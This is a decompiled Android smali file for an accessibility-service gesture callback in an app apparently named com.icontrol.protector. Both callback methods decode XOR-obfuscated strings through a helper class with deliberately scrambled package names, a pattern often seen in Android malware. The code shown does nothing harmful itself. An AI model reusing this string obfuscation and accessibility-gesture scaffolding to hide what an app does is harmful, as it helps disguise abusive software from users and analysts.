.class Lcom/icontrol/protector/a$c;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/a;->c0(II)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;-><init>()V

    return-void
.end method


# virtual methods
.method public onCancelled(Landroid/accessibilityservice/GestureDescription;)V
    .locals 2

    const/16 p1, 0xe

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x1f

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 1
        -0x2ft
        0x27t
        -0x6at
        -0x7ft
        0x6t
        0x13t
        0x32t
        0x1et
        -0x19t
        0x38t
        -0x75t
        -0x70t
        0x11t
        0x23t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7et
        0x4bt
        -0x1t
        -0x1bt
        0x63t
        0x46t
        0x42t
        0x59t
    .end array-data

    :array_2
    .array-data 1
        0x22t
        0x2ft
        -0x4at
        0x4ft
        -0x66t
        0x6at
        -0x2at
        0x5ct
        0x51t
        0x24t
        -0x46t
        0x58t
        -0x75t
        0x32t
        -0x2ft
        0x49t
        0x51t
        0x34t
        -0x42t
        0x58t
        -0x21t
        0x24t
        -0x3et
        0x42t
        0x12t
        0x26t
        -0x4dt
        0x47t
        -0x66t
        0x23t
        -0x73t
    .end array-data

    :array_3
    .array-data 1
        0x71t
        0x43t
        -0x21t
        0x2bt
        -0x1t
        0x47t
        -0x5dt
        0x2ct
    .end array-data
.end method

.method public onCompleted(Landroid/accessibilityservice/GestureDescription;)V
    .locals 2

    const/16 p1, 0xe

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x28

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 1
        -0x43t
        0x24t
        -0x4ct
        -0x38t
        -0x3et
        -0x64t
        -0x4dt
        0x43t
        -0x75t
        0x3bt
        -0x57t
        -0x27t
        -0x2bt
        -0x54t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x12t
        0x48t
        -0x23t
        -0x54t
        -0x59t
        -0x37t
        -0x3dt
        0x4t
    .end array-data

    :array_2
    .array-data 1
        -0x13t
        0x6at
        0x78t
        -0x6ct
        0x6t
        -0x2ft
        0x76t
        0x25t
        -0x62t
        0x61t
        0x74t
        -0x7dt
        0x17t
        -0x77t
        0x71t
        0x30t
        -0x62t
        0x65t
        0x7et
        -0x63t
        0x13t
        -0x70t
        0x66t
        0x21t
        -0x25t
        0x62t
        0x31t
        -0x7dt
        0x16t
        -0x61t
        0x60t
        0x30t
        -0x33t
        0x75t
        0x77t
        -0x7bt
        0xft
        -0x70t
        0x7at
        0x7bt
    .end array-data

    :array_3
    .array-data 1
        -0x42t
        0x6t
        0x11t
        -0x10t
        0x63t
        -0x4t
        0x3t
        0x55t
    .end array-data
.end method
